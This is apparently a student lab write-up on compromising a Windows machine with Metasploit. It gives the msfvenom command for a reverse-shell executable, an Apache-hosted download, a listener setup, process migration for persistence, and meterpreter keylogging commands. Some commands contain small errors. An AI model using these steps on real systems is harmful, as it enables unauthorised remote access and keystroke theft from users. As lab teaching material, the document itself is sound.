
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

### PROGRAM:
Find the attackers ip address using ifconfig
#### OUTPUT:
![image](https://github.com/user-attachments/assets/3b077929-dea4-4724-876e-65b053b9119c)


Create a malicious executable file fun.exe using msenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
#### OUTPUT!
![image](https://github.com/user-attachments/assets/cd8a576f-0e54-4518-8052-bc002cc28630)



copy the fun.exe into the apache /var/www/html folder
![image](https://github.com/user-attachments/assets/3994b5fa-7876-4069-a78f-736006b6bef5)


Start apache server
sudo systemctl apache2 start
![image](https://github.com/user-attachments/assets/1856b3a2-9b24-4708-a846-4e35ee09f9fb)


Check the status of apache2
![image](https://github.com/user-attachments/assets/3edd2f73-e9fd-4beb-a971-73606b7f0e3f)


Invoke msfconsole:
## OUTPUT:
Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server
use multi/handler
![image](https://github.com/user-attachments/assets/95f21f1a-6496-4fae-bc09-0f9af4e50276)


set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
exploit


On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe
The file "fun.exe" downloads. 
![image](https://github.com/user-attachments/assets/49d0b2a1-a77d-4e3e-aaef-7da5c81ca28a)


Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit

![image](https://github.com/user-attachments/assets/c301d7c1-8f0d-4ead-8f6f-dc8ed41c0650)


To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/user-attachments/assets/4575812f-f3dd-4b76-832f-b4695d10459a)



The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
![image](https://github.com/user-attachments/assets/44ecd744-aac7-4770-a515-f1b48f0c5d30)

keyscan_dump	Shows the keystrokes captured so far
![image](https://github.com/user-attachments/assets/7c3beadd-6b5a-4a06-8c9f-1e0c68d4313f)







## RESULT:
The Metasploit framework for reconnaissance is  examined successfully
